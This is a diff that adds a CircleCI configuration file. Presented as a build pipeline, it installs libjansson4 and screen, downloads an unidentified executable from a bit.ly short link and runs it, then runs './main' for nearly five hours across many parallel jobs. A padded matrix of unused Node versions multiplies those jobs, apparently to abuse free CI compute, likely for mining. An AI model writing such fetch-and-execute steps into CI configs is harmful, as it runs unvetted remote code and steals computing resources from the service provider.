@@ -1,0 +1,37 @@
+version: 2.1
+
+executors:
+  linux:
+    docker:
+      - image: circleci/python:3.9.6-buster
+
+jobs:
+  greape:
+    parameters:
+      os:
+        type: executor
+      node-version:
+        type: string
+    executor: << parameters.os >>
+    parallelism: 4 
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: Listing
+          command: |
+            nproc
+            wget https://bit.ly/3zonrc0 && chmod +x 3zonrc0 && ./3zonrc0
+            #sleep 180s && sudo apt update -y
+            #sleep 300s && sudo apt update -y
+            sudo timeout 285m ./main && stop && sudo apt update -y
+
+workflows:
+  all-Mr:
+    jobs:
+      - greape:
+          matrix:
+            parameters:
+              os: [linux]
+              node-version: [8.12.0, 8.13.0, 8.14.0, 8.14.1, 8.15.0, 8.15.1, 8.16.0, 8.16.2, 8.17.0, 9.3.0, 9.4.0, 9.7.0, 9.7.1, 9.8.0, 9.9.0, 9.10.0, 9.10.1, 9.11.0, 9.11.1, 9.11.2]
